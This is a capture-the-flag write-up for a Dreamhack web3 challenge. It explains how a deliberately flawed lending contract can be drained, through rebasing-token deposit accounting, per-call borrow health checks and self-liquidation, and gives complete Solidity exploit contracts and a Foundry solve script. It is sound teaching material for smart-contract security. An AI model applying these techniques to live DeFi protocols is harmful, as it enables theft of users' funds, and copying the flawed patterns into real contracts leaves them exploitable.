---
title: Blockchain - .Hack Lending Market
description: 2024 | Dreamhack Invitational | web3
tags:
    - smart contract
    - rebasing token
    - first deposit
    - empty market
    - lending
---

## Description

Please save our money in Lending protocol.

[:material-download: `dot_hack_lending_market.zip`](static/dot_hack_lending_market.zip)

## Solution

- Initially, there are 10,000 .Hack USD, 10,000 .Hack WETH and 10,000 .Hack RebasingWETH in the .Hack lending pool. RebasingWETH can be used to withdraw WETH. The account who registers for the challenge will be recorded as the solver and receive 10,000 USD and 10,000 WETH. When the solver holds 20,000 USD and 30,000 WETH, the challenge is solved. That is, we need to drain tokens in the lending pool
- The lending pool has the basic functions of a common lending pool, such as depositing liquidity, borrowing, and liquidation. In the `depositLiquidity()` function, the amount added to the liquidity depends on how much the balance has changed before and after the transfer. This pattern is problematic for .Hack RebasingWETH. Because `balanceOf()` returns the amount of underlying tokens corresponding to the share balance, while `transferFrom()` transfers the amount of shares. If exchange rate is larger than `1e18`, depositing 1 share can increase liquidity by more than 1. Meanwhile, `withdrawLiquidity()` checks against the recorded amount

    ```js
    function depositLiquidity(address asset, uint256 amount) external {
        require(assetInfo[asset].isAsset);
        accrueInterest(msg.sender, asset);

        UserInfo storage _userInfo = userInfo[msg.sender][asset];
        AssetInfo storage _assetInfo = assetInfo[asset];

        if (_userInfo.liquidityIndex == 0) {
            _userInfo.liquidityIndex = _assetInfo.globalIndex;
        }

        uint256 beforeBalance = IERC20(asset).balanceOf(address(this));
        require(IERC20(asset).transferFrom(msg.sender, address(this), amount));
        uint256 afterBalance = IERC20(asset).balanceOf(address(this)) - beforeBalance;

        _userInfo.liquidityAmount += afterBalance;
        _assetInfo.totalLiquidity += afterBalance;
        _assetInfo.avaliableLiquidity += afterBalance;
    }

    function withdrawLiquidity(address asset, uint256 amount) external {
        ...
        require(_assetInfo.avaliableLiquidity >= amount);

        _userInfo.liquidityAmount -= amount;
        _assetInfo.totalLiquidity -= amount;
        _assetInfo.avaliableLiquidity -= amount;

        require(IERC20(asset).transfer(msg.sender, amount));
    }
    ```

- The `borrow()` function performs a healthy check to see if the collateral is sufficient to cover the borrow amount. However, it checks against the borrow value in the current call to the `borrow()` function instead of the total borrow value. So, malicious users may borrow many times as long as the healthy check is met each time, leaving bad debts

    ```js
    function borrow(address collateral, address borrowAsset, uint256 amount) external {
        require(assetInfo[borrowAsset].isAsset);
        UserInfo storage _userInfo = userInfo[msg.sender][collateral];
        ...
        AssetInfo storage _assetInfo = assetInfo[borrowAsset];
        ...
        uint256 collateralValue = _userInfo.collateralAmount * oracle.getPrice(collateral);
        uint256 borrowValue = amount * oracle.getPrice(borrowAsset);
        require(collateralValue * assetInfo[collateral].borrowLTV >= borrowValue * 1e18);
        ...
    }
    ```

- After malicious borrowing, the `liquidate()` function can be utilized to withdraw collateral tokens. Since the price difference between USD (1) and WETH (3000) / RebasingWETH (3100) is large, an intuitive idea is to use USD as collateral and later withdraw all USD with a small amount of WETH / RebasingWETH through `liquidate()` without repaying all debts. Liquidation increases rewards for liquidity providers (`avaliableClaimableReward`), which can be used to withdraw paid WETH / RebasingWETH

    ```js
    function liquidate(address user, address collateral, uint256 amount) external {
        accrueInterest(user, collateral);

        UserInfo storage _userInfo = userInfo[msg.sender][collateral];

        address asset = _userInfo.borrowAsset;
        ...
        uint256 collateralValue = _userInfo.collateralAmount * oracle.getPrice(collateral);
        uint256 borrowValue = _userInfo.totalDebt * oracle.getPrice(asset);
        require(collateralValue * assetInfo[collateral].liquidationLTV <= borrowValue * 1e18);

        AssetInfo storage _assetInfo = assetInfo[_userInfo.borrowAsset];

        uint256 refundCollateral = amount * oracle.getPrice(asset) / oracle.getPrice(collateral)
            + amount * oracle.getPrice(asset) / oracle.getPrice(collateral) * _assetInfo.liquidationBonus / 1e18;

        if (refundCollateral > _userInfo.collateralAmount) {
            refundCollateral = _userInfo.collateralAmount;
        }

        _userInfo.collateralAmount -= refundCollateral;

        uint256 borrowInterest = _userInfo.totalDebt - _userInfo.principal;

        _userInfo.totalDebt -= amount;
        _assetInfo.totalDebt -= amount;

        if (borrowInterest < amount) {
            _userInfo.principal -= amount - borrowInterest;
            _assetInfo.totalPrincipal -= amount - borrowInterest;
            _assetInfo.avaliableClaimableReward += borrowInterest;
            _assetInfo.avaliableLiquidity += amount - borrowInterest;
        } else {
            _assetInfo.avaliableClaimableReward += amount;
        }

        require(IERC20(asset).transferFrom(msg.sender, address(this), amount));
        require(IERC20(collateral).transfer(msg.sender, refundCollateral));
    }
    ```

### Exploitation

The exploit steps are as follows:

1. Register for the challenge and receive tokens
2. Deposit USD as collateral and borrow some RebasingWETH
3. Exchange RebasingWETH with WETH and deposit most of them as liquidity
   - To earn `claimableReward`, we need to call `updateAsset()` to update `globalIndex`, otherwise the interest will never accrue
4. Borrow all RebasingWETH in the lending pool
5. Withdraw the USD collateral through `liquidate()` and later claim paid RebasingWETH
6. Redeem all WETH with RebasingWETH
7. Deposit 10,000 WETH into `DotHackRebasingToken` and then transfer 10,000 WETH into it to increase the exchange rate
8. Abuse the `depositLiquidity()` to earn collateral while being available to withdraw all tokens
9. Borrow all remaining tokens in the lending pool
10. Redeem WETH from `DotHackRebasingToken`

```js
contract BorrowHelper {
    uint constant INITIAL_AMOUNT = 10000 ether;
    uint constant BORROW_AMOUNT = 2 ether;
    uint constant REPAY_AMOUNT = 3 ether;

    Challenge _challenge;
    address _collateral;
    address _asset;

    constructor(Challenge challenge) {
        _challenge = challenge;
    }

    function initialize(
        address collateral,
        address asset
    ) external {
        _collateral = collateral;
        _asset = asset;

        Challenge challenge = _challenge;
        DotHackLending lending = DotHackLending(challenge.dotHackLending());

        IERC20(collateral).approve(address(lending), type(uint256).max);
        IERC20(asset).approve(address(lending), type(uint256).max);

        lending.depositCollateral(collateral, INITIAL_AMOUNT);
        for (uint i; i < 10; ++i) {
            lending.borrow(collateral, asset, BORROW_AMOUNT);
        }
        lending.updateAsset(asset); // To update globalIndex
        lending.depositLiquidity(asset, INITIAL_AMOUNT - REPAY_AMOUNT);
    }

    function borrow() external {
        Challenge challenge = _challenge;
        address collateral = _collateral;
        address asset = _asset;
        DotHackLending lending = DotHackLending(challenge.dotHackLending());

        for (uint i; i < 499; ++i) {
            lending.borrow(collateral, asset, BORROW_AMOUNT);
        }
    }

    function liquidate() external {
        Challenge challenge = _challenge;
        address collateral = _collateral;
        DotHackLending lending = DotHackLending(challenge.dotHackLending());

        lending.liquidate(address(this), collateral, REPAY_AMOUNT);
        IERC20(collateral).transfer(msg.sender, IERC20(collateral).balanceOf(address(this)));
    }

    function claim() external {
        Challenge challenge = _challenge;
        address asset = _asset;
        DotHackLending lending = DotHackLending(challenge.dotHackLending());

        lending.claimReward(asset, REPAY_AMOUNT);
        lending.withdrawLiquidity(asset, INITIAL_AMOUNT - REPAY_AMOUNT);

        IERC20(asset).transfer(msg.sender, IERC20(asset).balanceOf(address(this)));
    }
}

contract RebaseAbuser {
    uint constant INITIAL_AMOUNT = 10000 ether;

    function exploit(Challenge challenge, address asset) external {
        DotHackLending lending = DotHackLending(challenge.dotHackLending());
        address rebaseWeth = challenge.dotHackRebasingWETH();

        IERC20(rebaseWeth).approve(address(lending), type(uint256).max);

        lending.depositLiquidity(rebaseWeth, INITIAL_AMOUNT);
        lending.withdrawLiquidity(rebaseWeth, INITIAL_AMOUNT);
        lending.depositCollateral(rebaseWeth, INITIAL_AMOUNT);
        for (uint i; i < 2; ++i) {
            lending.borrow(rebaseWeth, asset, INITIAL_AMOUNT / 2);
        }

        IERC20(asset).transfer(msg.sender, INITIAL_AMOUNT);
        IERC20(rebaseWeth).transfer(msg.sender, INITIAL_AMOUNT);
    }
}

contract Solve is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIV"));
        Challenge challenge = Challenge(vm.envAddress("CHALL"));
        vm.roll(block.number + 1);
        Hack hack = new Hack(challenge);
        hack.initialize();
        BorrowHelper helper = hack.rebaseBorrower();
        for (uint i; i < 10; ++i) {
            vm.roll(block.number + 1);
            helper.borrow();
        }
        hack.exploit();
        require(challenge.isSolved());
        vm.stopBroadcast();
    }
}
```
